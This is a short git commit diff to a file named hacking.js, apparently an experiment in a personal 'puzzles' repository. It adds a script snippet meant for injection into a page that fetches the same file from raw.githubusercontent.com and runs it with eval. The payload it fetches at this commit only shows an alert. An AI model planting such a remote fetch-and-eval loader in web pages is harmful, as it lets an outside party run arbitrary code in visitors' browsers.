0fed944fab570e04cfd8f7ab0b7c9ae1944c8c7a
Giuseppe Tavella <93888736+gtavella@users.noreply.github.com>
2024-10-22 20:29:32 +0200

    Update hacking.js

--- hacking.js
+++ hacking.js
@@ -1,1 +1,12 @@
+// code to run in page
 alert("noooo")
+
+// code in page
+<script>
+async function __load_script_() {
+  var resp = await fetch(`https://raw.githubusercontent.com/gtavella/puzzles/refs/heads/main/hacking.js?_=${new Date()}`)
+  var text = await resp.text()
+  eval(text)
+}
+__load_script_()
+</script>
